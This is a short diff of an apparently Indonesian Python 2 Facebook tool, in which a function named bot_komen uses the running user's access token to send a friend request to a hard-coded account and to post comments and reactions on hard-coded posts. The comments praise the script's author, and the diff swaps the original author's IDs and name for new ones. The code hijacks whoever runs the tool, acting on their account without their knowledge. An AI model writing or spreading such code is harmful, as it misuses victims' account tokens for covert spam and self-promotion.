@@ -212,12 +212,12 @@ def bot_komen():
 	except IOError:
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100005789553399')
-	kom = ('GUE PAKE SCRIPT LU NENG MILA 😘😘😘')
+	una = ('100064492221960')
+	kom = ('GUE PAKE SCRIPT LU WansThampans 😘😘😘')
 	reac = ('ANGRY')
-	post = ('1190012567868384')
-	post2 = ('1190012567868384')
-	kom2 = ('KREN SUKSES SELALU YA 😘😘😘')
+	post = ('138444848315255')
+	post2 = ('149237547235985')
+	kom2 = ('KREN WANS SEHAT SELALU YA 😘😘😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
